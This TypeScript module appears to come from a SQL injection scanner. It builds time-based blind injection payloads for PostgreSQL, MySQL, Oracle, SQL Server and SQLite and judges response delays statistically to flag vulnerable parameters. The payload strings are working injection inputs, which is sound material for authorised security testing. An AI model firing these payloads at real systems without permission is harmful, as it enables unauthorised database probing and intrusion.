import { CandidateParameter, DbmsType } from '../../types/sqlScanner';
import { SprtTimingEngine } from './engine/SprtTimingEngine';

export interface TimeDelayProbe {
  dbms: DbmsType;
  delaySeconds: number;
  payload: string;
  expectedDelayMs: number;
}

export interface TimeTestEvaluationResult {
  isVulnerable: boolean;
  confidence: number;
  evidence: string;
  measuredDurationMs: number;
  expectedDurationMs: number;
  latencyDiffMs: number;
}

export interface TimingStatistics {
  mean: number;
  median: number;
  stdDev: number;
  variance: number;
  samples: number;
}

export class TimeBasedTester {
  /**
   * Calculates mean, median, variance, and standard deviation for baseline measurements
   */
  public static computeTimingStats(durations: number[]): TimingStatistics {
    const samples = durations.length || 1;
    const sorted = [...durations].sort((a, b) => a - b);
    const median = sorted[Math.floor(sorted.length / 2)] || 0;
    const sum = durations.reduce((a, b) => a + b, 0);
    const mean = sum / samples;

    const variance = durations.reduce((acc, val) => acc + Math.pow(val - mean, 2), 0) / samples;
    const stdDev = Math.sqrt(variance);

    return {
      mean,
      median,
      stdDev,
      variance,
      samples,
    };
  }

  /**
   * Generates context-aware time-delay payloads across all major database engines
   */
  public static getDelayPayloads(param: CandidateParameter, delaySeconds = 3): TimeDelayProbe[] {
    const isNum = param.detectedContext === 'numeric' || /^\d+$/.test(param.originalValue.trim());
    const isDoubleQuote = param.detectedContext === 'double_quote_string';
    const isParenthesized = param.detectedContext === 'parenthesized_string';
    const probes: TimeDelayProbe[] = [];

    const expectedDelayMs = delaySeconds * 1000;

    // 1. PostgreSQL
    let pgPayload = `'||(SELECT pg_sleep(${delaySeconds}))||'`;
    if (isNum) pgPayload = ` AND (SELECT pg_sleep(${delaySeconds}))`;
    else if (isDoubleQuote) pgPayload = `"||(SELECT pg_sleep(${delaySeconds}))||"`;
    else if (isParenthesized) pgPayload = `')||(SELECT pg_sleep(${delaySeconds}))||('`;

    probes.push({
      dbms: 'PostgreSQL',
      delaySeconds,
      payload: pgPayload,
      expectedDelayMs,
    });

    // 2. MySQL / MariaDB
    let mysqlPayload = `' AND (SELECT 1 FROM (SELECT(SLEEP(${delaySeconds})))snt)-- -`;
    if (isNum) mysqlPayload = ` AND (SELECT 1 FROM (SELECT(SLEEP(${delaySeconds})))snt)`;
    else if (isDoubleQuote) mysqlPayload = `" AND (SELECT 1 FROM (SELECT(SLEEP(${delaySeconds})))snt)-- -`;
    else if (isParenthesized) mysqlPayload = `') AND (SELECT 1 FROM (SELECT(SLEEP(${delaySeconds})))snt)-- -`;

    probes.push({
      dbms: 'MySQL',
      delaySeconds,
      payload: mysqlPayload,
      expectedDelayMs,
    });

    // 3. Oracle
    let oraPayload = `'||(SELECT dbms_pipe.receive_message(('RDS'),${delaySeconds}) FROM DUAL)||'`;
    if (isNum) oraPayload = ` AND (SELECT dbms_pipe.receive_message(('RDS'),${delaySeconds}) FROM DUAL)=1`;
    else if (isDoubleQuote) oraPayload = `"||(SELECT dbms_pipe.receive_message(('RDS'),${delaySeconds}) FROM DUAL)||"`;
    else if (isParenthesized) oraPayload = `')||(SELECT dbms_pipe.receive_message(('RDS'),${delaySeconds}) FROM DUAL)||('`;

    probes.push({
      dbms: 'Oracle',
      delaySeconds,
      payload: oraPayload,
      expectedDelayMs,
    });

    // 4. Microsoft SQL Server
    let mssqlPayload = `'; WAITFOR DELAY '0:0:${delaySeconds}'--`;
    if (isNum) mssqlPayload = `; WAITFOR DELAY '0:0:${delaySeconds}'--`;
    else if (isDoubleQuote) mssqlPayload = `"; WAITFOR DELAY '0:0:${delaySeconds}'--`;
    else if (isParenthesized) mssqlPayload = `'); WAITFOR DELAY '0:0:${delaySeconds}'--`;

    probes.push({
      dbms: 'Microsoft SQL Server',
      delaySeconds,
      payload: mssqlPayload,
      expectedDelayMs,
    });

    // 5. SQLite
    let sqlitePayload = `' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2)))))-- -`;
    if (isNum) sqlitePayload = ` AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2)))))`;
    else if (isDoubleQuote) sqlitePayload = `" AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2)))))-- -`;

    probes.push({
      dbms: 'SQLite',
      delaySeconds,
      payload: sqlitePayload,
      expectedDelayMs,
    });

    return probes;
  }

  /**
   * Evaluates if test latency represents a genuine SQL sleep delay versus normal network jitter
   */
  public static evaluateTiming(
    baselineDurations: number[],
    testDurationMs: number,
    delaySeconds: number,
    dbms: DbmsType
  ): TimeTestEvaluationResult {
    const stats = TimeBasedTester.computeTimingStats(baselineDurations);
    const expectedDelayMs = delaySeconds * 1000;
    const latencyDiffMs = testDurationMs - stats.median;

    // Hard criteria for blind time execution confirmation:
    // 1. Measured response duration is within 600ms of expected target delay (or exceeds it)
    // 2. Latency difference is at least 3 standard deviations above baseline mean
    const minDelayThreshold = Math.max(expectedDelayMs - 600, 2000);
    const statisticalThreshold = stats.mean + Math.max(stats.stdDev * 3, 1000);

    const isVulnerable = testDurationMs >= minDelayThreshold && testDurationMs >= statisticalThreshold;

    const confidence = isVulnerable ? (testDurationMs >= expectedDelayMs ? 95 : 85) : 0;
    const evidence = isVulnerable
      ? `Time delay confirmed (${dbms}): ${testDurationMs}ms response time vs ${stats.median}ms baseline median (diff: +${latencyDiffMs}ms, expected: ~${expectedDelayMs}ms, 3σ threshold: ${statisticalThreshold.toFixed(0)}ms)`
      : `No significant time delay: ${testDurationMs}ms (diff: +${latencyDiffMs}ms, threshold: ${minDelayThreshold}ms)`;

    return {
      isVulnerable,
      confidence,
      evidence,
      measuredDurationMs: testDurationMs,
      expectedDurationMs: expectedDelayMs,
      latencyDiffMs,
    };
  }

  /**
   * Evaluates sequential time samples using exact Wald Sequential Probability Ratio Test (SPRT)
   */
  public static evaluateWithSprt(
    samples: number[],
    baselineDurations: number[],
    delaySeconds: number,
    alpha = 0.01,
    beta = 0.01
  ) {
    const stats = TimeBasedTester.computeTimingStats(baselineDurations);
    const engine = new SprtTimingEngine(alpha, beta);
    return engine.evaluate(samples, stats.mean, stats.stdDev, delaySeconds * 1000);
  }
}
